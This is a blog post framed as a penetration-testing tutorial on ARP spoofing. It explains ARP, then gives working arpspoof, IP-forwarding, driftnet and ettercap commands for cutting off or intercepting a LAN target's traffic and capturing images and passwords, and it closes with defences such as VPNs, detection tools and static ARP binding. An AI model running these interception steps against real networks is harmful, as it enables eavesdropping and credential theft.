<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="msvalidate.01" content="F7959A0570D0607B4121B537616DDEAB"><meta name="renderer" content="webkit"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta name="keywords" content="ARP Spoofing, ARP Poisoning, Kali, Penetration Testing, Pen Test, internal network, attack"><meta name="description" content="ARP spoofing is a type of attack in which a malicious actor sends falsified ARP messages over a local area network. We use Kali/Parrot Linux to make a simple ARP Spoofing."><title>Penetration Testing | ARP Spoofing(Poisoning) in the internal network &amp; How to prevent itTheodore Cooper's Blog</title><script src="/sweetalert2/dist/sweetalert2.all.min.js"></script><script src="/promise-polyfill/dist/polyfill.js"></script><link rel="stylesheet" href="/sweetalert2/dist/sweetalert2.min.css"><link href="/css/fontisto/fontisto.min.css" rel="stylesheet"><link rel="stylesheet" href="/libs/highlight/styles/androidstudio.css"><link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="/css/style.css"><link href="http://fonts.googleapis.com/css?family=Raleway:100,200,300,400" rel="stylesheet"><script src="/dist/lib/modernizr.touch.js"></script><link href="/dist/mfb.css" rel="stylesheet"><script async src="https://www.googletagmanager.com/gtag/js?id=G-DZQ9LW0MKP"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-DZQ9LW0MKP")</script><script>!function(t,e,n,c,a,r){t[n]=t[n]||function(){(t[n].q=t[n].q||[]).push(arguments)},(a=e.createElement(c)).async=1,a.src="https://www.clarity.ms/tag/4dyudg5g3l",(r=e.getElementsByTagName(c)[0]).parentNode.insertBefore(a,r)}(window,document,"clarity","script")</script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Theodore Cooper's Blog" type="application/atom+xml"></head><body id="bodyx"><ul id="menu" class="mfb-component--br mfb-slidein-spring" data-mfb-toggle="hover"><li class="mfb-component__wrap"><a class="mfb-component__button--main"><i class="mfb-component__main-icon--resting fi fi-plus-a"></i> <i class="mfb-component__main-icon--active fi fi-close-a"></i></a><ul class="mfb-component__list"><li><a href="https://theodorecooper.github.io/atom.xml" data-mfb-label="RSS" class="mfb-component__button--child" target="_blank"><i class="mfb-component__child-icon fi fi-rss"></i></a></li><li><a href="https://theodorecooper.github.io/tags" data-mfb-label="View the tags" class="mfb-component__button--child" target="_blank"><i class="mfb-component__child-icon fi fi-hashtag"></i></a></li><li><a href="https://theodorecooper.github.io/Github" data-mfb-label="Follow me on Github" class="mfb-component__button--child" target="_blank"><i class="mfb-component__child-icon fi fi-github"></i></a></li><li><a href="https://theodorecooper.github.io/Twitter" data-mfb-label="Follow me on Twitter" class="mfb-component__button--child" target="_blank"><i class="mfb-component__child-icon fi fi-twitter"></i></a></li><li><a href="javascrip:void(0)" onclick="donate()" data-mfb-label="Buy me a cup of coffee!" class="mfb-component__button--child" target="_self"><i class="mfb-component__child-icon fi fi-bitcoin"></i></a></li></ul></li></ul><script src="/dist/mfb.js"></script><script>var donate=function(){Swal.fire({title:"Donate",html:"❤Buy me a cup of coffee!!! <br><br>zpub6maNAHkLN2gfztxLDnKVjJASMk1Ra5DgdF2yGSTov7VXUn3Eijusyye89aKSwZWxrRas4QJnVtwXKEzdpKhTMSgiXF9RuK6AMm6w3V4jnMr",imageUrl:"/btcqrcode.png",imageWidth:205,imageHeight:205,imageAlt:"Bitcoin Donate",animation:!0,footer:"<b>❤Thank you for donation!!!</b>"})}</script><div class="hd posts"><a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a><div class="post-title"><p>Penetration Testing | ARP Spoofing(Poisoning) in the internal network &amp; How to prevent it</p><hr></div><div class="post-content"><h1><span id="penetration-testing-arp-spoofingpoisoning-in-the-internal-network-amp-how-to-prevent-it"><center>Penetration Testing | ARP Spoofing(Poisoning) in the internal network &amp; How to prevent it</center></span></h1><p><img src="arpspoofing.jpg" alt="arpspoofing"></p><hr><h2><span id="address-resolution-protocol-arp">Address Resolution Protocol (<strong>ARP</strong>)</span></h2><blockquote><p>Address Resolution Protocol (<strong>ARP</strong>) is a procedure for mapping a dynamic Internet Protocol address (IP address) to a permanent physical machine address in a local area network (LAN). The physical machine address is also known as a Media Access Control or MAC address.</p></blockquote><h2><span id="how-arp-works">How ARP works?</span></h2><p><img src="arp.png" alt="arp"></p><p>​ When a new device is joined into a LAN, it is assigned a unique IP address to use for identification and communication. When an incoming packet destined for a host machine on a particular LAN arrives at a gateway, the gateway asks the ARP program to find a MAC address that matches the IP address. A table called the ARP cache maintains a record of each IP address and its corresponding MAC address.</p><p>​ If the MAC address is not present in the ARP cache table then the source device will generate an <strong><em>ARP Request</em></strong> message. In the request message the source puts its own MAC address, its IP address, destination IP address and the destination MAC address is left blank since the source is trying to find this.</p><p>​ In generally, Address Resolution Protocol is used to obtain the MAC address of the destination host based on its IP address. It converts the IP address of the target host into a MAC address before sending a frame.</p><h2><span id="types-of-arp-spoofing">Types of ARP Spoofing</span></h2><p>​ There are two types of ARP Spoofing:</p><ol><li><p>For instance, there are three hosts <code>A</code>, <code>B</code> and <code>C</code>. <code>A</code> wants to communicate with <code>B</code>, when <code>A</code> asks <code>C</code> that whether he is <code>B</code>, <code>C</code> shamelessly says: “YES!!!”. So packages that <code>A</code> should have sent to <code>B</code> are sent to <code>C</code>.</p></li><li><p>Still that example, <code>A</code> wants to communicate with <code>B</code>, this time <code>A</code> asks that who is <code>B</code>, <code>C</code> shamelessly says again: “I am <code>B</code>!!!” So, <code>A</code> sends packages to <code>C</code>, then <code>C</code> says to <code>B</code>: “I am <code>A</code>!!!” and send the package to him.</p></li></ol><h2><span id="what-can-we-do">What can we do?</span></h2><ul><li>Disconnect other devices’ network connections</li><li>Hijack the traffic of other devices and gateways in the LAN to obtain sensitive information like password, browsing images and so on</li></ul><p><img src="spoofing.png" alt="arpspoofing"></p><h2><span id="arp-spoofing-tutorial">ARP Spoofing Tutorial</span></h2><p>​ First of all, host and target must be in a same LAN, of course.</p><h3><span id="0-environment">#0. Environment</span></h3><ul><li>Parrot OS(You can also use Kali Linux)</li><li>Wireless Network Card to connect to the WiFi.</li></ul><h3><span id="1-get-local-ip">#1. Get local IP</span></h3><p>​ Open a terminal:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ifconfig</span></span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ip addr show</span></span><br></pre></td></tr></table></figure><h3><span id="2-scan-targets-ip">#2. Scan target’s IP</span></h3><p>​ Usually we use <strong><em>Nmap</em></strong> to scan target’s IP:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo nmap -sP 192.168.1.1/24</span></span><br></pre></td></tr></table></figure><p>(<code>192.168.1.1</code> is the default gateway address, it depends your router.)</p><p>​ Another easy way is use <code>Zenmap</code>, it’s an official GUI version of <code>Nmap</code>. It is a multi-platform (Linux, Windows, Mac OS X, BSD, etc.) free and open source application which aims to make Nmap easy for beginners to use.</p><p>​ The easiest way is – if you have already logged in the <code>192.168.1.1</code> – sometimes <code>admin</code> as username and <code>admin</code> as password – you see, quite easy.</p><h3><span id="3-disconnect-targets-connections">#3. Disconnect target’s connections</span></h3><h4><span id="use-arpspoof">Use <code>arpspoof</code></span></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo arpspoof [-i interface] [-t target_ip] &lt;host_ip&gt;</span></span><br></pre></td></tr></table></figure><ul><li>interface: Your wireless interface(<code>ifconfig</code> to get)</li><li>target: Target’s IP address</li><li>host: Your IP address.</li></ul><p>​ Because the attacker did not enable port forwarding, the request could not be released, and the target’s network was disconnected. So if we enable port forwarding, we can hijack target’s traffic.</p><h3><span id="4-hijack-targets-traffic">#4. Hijack target’s traffic</span></h3><p>​ Enable port forwarding:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo <span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span></span><br></pre></td></tr></table></figure><p>​ Then we use <code>arpspoof</code> like this:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo arpspoof [-i interface] &lt;host_ip&gt; &lt;target_ip&gt;</span></span><br></pre></td></tr></table></figure><p>​ Because the target machine is connected to WiFi, when performing ARP Spoofing, you need to change the order with the target machine. If you don’t change it, you can see that the MAC address of the gateway is the same as the MAC address of the attacking machine during ARP Spoofing, so that the target machine cannot communicate normally.</p><h4><span id="use-driftnet-to-get-images">Use <code>driftnet</code> to get images</span></h4><p>​ After hijacking the traffic successfully, we can save income images from target with <code>driftnet</code>(HTTP only).</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo driftnet [-i interface]</span></span><br></pre></td></tr></table></figure><p>​ Moreover,</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo driftnet [-d directory] [-i interface]</span><br></pre></td></tr></table></figure><p>​ to set directory that images will be saved.</p><h4><span id="use-ettercap-to-get-passwords">Use <code>Ettercap</code> to get passwords</span></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ettercap -Tq [-i interface]</span></span><br></pre></td></tr></table></figure><ul><li>-T: Text mode</li><li>-q: Quiet mode</li></ul><p>​ Also, you can use <code>Wireshark</code>, it has a user-friendly GUI and easier for beginners.</p><h2><span id="how-to-prevent-arp-spoofing">How to prevent ARP Spoofing?</span></h2><p>​ To be honest, it’s not hard to prevent ARP Spoofing, but many people don’t do like that.</p><h3><span id="1-rely-on-virtual-private-networksvpn">#1. Rely on Virtual Private Networks(VPN)</span></h3><p><img src="VPN.jpg" alt="vpn"></p><p>​ One way to prevent ARP spoofing from happening in the first place is to rely on Virtual Private Networks(VPN). When you connect to the internet, you typically first connect to an Internet Service Provider(ISP) in order to connect to another website. However, when you use a VPN, you’re using an encrypted tunnel that largely blocks your activity from ARP spoofing hackers. Both the method by which you’re conducting the online activity and the data that goes through it is encrypted.</p><p>​ Moreover, you should consider a VPN if you travel frequently or use public WiFi hotspots while working with sensitive information or data. You could also consider using a mobile internet device that could help reduce the chances of someone working their way into your system through public WiFi with no login or password requirements. Although VPN can be a safer way to use the internet, it can sometimes slow down your online access due to the encrypting and decrypting processing power.</p><h3><span id="2get-a-detection-tool">#2.Get a Detection Tool</span></h3><p>​ Even with ARP knowledge and techniques in place, it’s not always possible to detect a spoofing attack. Hackers are becoming increasingly stealthy at remaining undetected and use new technologies and tools to stay ahead of their victims. Instead of strictly focusing on prevention, make sure you have a detection method in place. Using a third-party detection tool can help you see when a spoofing attack is happening so you can work on stopping it in its tracks.</p><p>​ A third-party tool like <code>XArp</code> can help detect if you are being attacked by ARP spoofing. However, that’s just the first step to ARP spoofing protection. In addition to using the right tools, you should also consider a robust monitoring tool or service.</p><p>Some third-party tools:</p><ul><li><a target="_blank" rel="noopener" href="http://ee.lbl.gov/"><strong><em>Arpwatch</em></strong></a>: If the cross-platform open-source tool <code>Arpwatch</code> is integrated into a local IPv4 network, it continuously records all ARP activities in the LAN. All inbound ARP packets are taken by the program along with accompanying address information and stored in a central database. If older entries are found that don’t match the data currently being sent, the program sends an email warning to the administrator. The procedure is effective, but is only suitable for networks with static IP addresses. If LAN IPs are distributed dynamically over a DHCP server, any change in the IP/MAC mapping results in a false alarm.</li><li><a target="_blank" rel="noopener" href="https://www.isl.de/en/arp-guard/product.html"><strong><em>ARP-Guard</em></strong></a>: <code>ARP-Guard</code> from the company ISL also monitors the internal network and relies on two different sensors. The LAN sensor works similarly to <code>Arpwatch</code>, analyzing inbound data packets and sounding an alarm in case of any discrepancies. The sensor management architecture of the software also has an SNMP sensor, which uses the Simple Network Management Protocol(SNMP) to access devices connected to the LAN and read out their ARP tables. In this way, not only are ARP attacks localized and warded off; the integrated address management also allows administrators to detect unwanted devices and prevent them from accessing the network.</li><li><a target="_blank" rel="noopener" href="http://www.xarp.net/"><strong><em>XArp</em></strong></a>: The <code>XArp</code> software relies on both active and passive modules to protect a network from ARP spoofing. The passive modules analyze ARP packets that are sent on the network, and match the accompanying address assignment with older entries. If discrepancies are noticed, the program alarm sounds. The control mechanism is based on statistical analyses and checks the network traffic on the basis on of various patterns which, according to developers, indicate ARP attacks. The sensitivity of this traffic filter can be adjusted gradually. The active modules of the software send their own packets into the network, in order to validate the ARP tables of the accessible devices and to fill them with valid entries.</li></ul><h3><span id="3mac-address-binding">#3.MAC Address Binding</span></h3><p>​ Binding MAC address is the easiest way the prevent ARP Spoofing, in Linux, just use:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo arp -s &lt;ip&gt; &lt;mac&gt;	<span class="comment">#Bind MAC address</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo arp -d &lt;ip&gt; &lt;mac&gt;	<span class="comment">#Disbing MAC address</span></span></span><br></pre></td></tr></table></figure><ul><li>ip: Your IP address</li><li>mac: Your MAC address</li></ul><p>​ In Windows, open <code>cmd</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -s &lt;ip&gt; &lt;mac&gt;	#temporary</span><br></pre></td></tr></table></figure><p>​ or</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">netsh i i show in	#show Idx</span><br><span class="line"></span><br><span class="line">netsh -c i i add ne &lt;Idx&gt; &lt;ip&gt; &lt;mac&gt; store=active	#temporary</span><br><span class="line"></span><br><span class="line">netsh -c i i add ne &lt;Idx&gt; &lt;ip&gt; &lt;mac&gt;</span><br><span class="line"></span><br><span class="line">netsh -c i i del ne &lt;Idx&gt;	#Disbing MAC address</span><br></pre></td></tr></table></figure><p>​ (Some routers have functions to bind MAC address too.)</p><p>—————<br><b>Author</b>：Theodore Cooper<br><b>Address</b>： <a href="https://theodorecooper.github.io/2021/arp-spoofing/">https://theodorecooper.github.io/2021/arp-spoofing/</a><br><b>Copyright</b>：Copyright © 2020 Theodore Cooper. All rights reserved.<br>—————<br></p></div><div id="disqus_thread"></div><script>var disqus_config=function(){this.page.url=PAGE_URL,this.page.identifier=PAGE_IDENTIFIER};!function(){var e=document,t=e.createElement("script");t.src="https://ccooperr.disqus.com/embed.js",t.setAttribute("data-timestamp",+new Date),(e.head||e.body).appendChild(t)}()</script><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script src="/js/crash_cheat.js"></script><div class="footer" id="footer"><p>Copyright © 2020 <a class="flink" rel="external nofollow noopener" target="_blank" href="https://hexo.io">Hexo</a>-<a class="flink" rel="external nofollow noopener" target="_blank" href="https://github.com/theodorecooper">Theodore Cooper</a>. All rights reserved. <label class="el-switch el-switch-green el-switch-sm" style="vertical-align:sub"><input type="checkbox" name="switch" id="update_style"> <span class="el-switch-style"></span></label></p></div><script src="/libs/jquery.min.js"></script><script src="/libs/highlight/highlight.pack.js"></script><script src="/js/js.js"></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#0c243d}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{scale:1,hHeadPos:.5,vHeadPos:.618,jsonPath:"/live2dw/assets/tororo.model.json"},display:{superSample:2,width:200,height:400,position:"left",hOffset:0,vOffset:-50},mobile:{show:!1,scale:.5},react:{opacityDefault:.7,opacityOnHover:.2},log:!1})</script></body></html>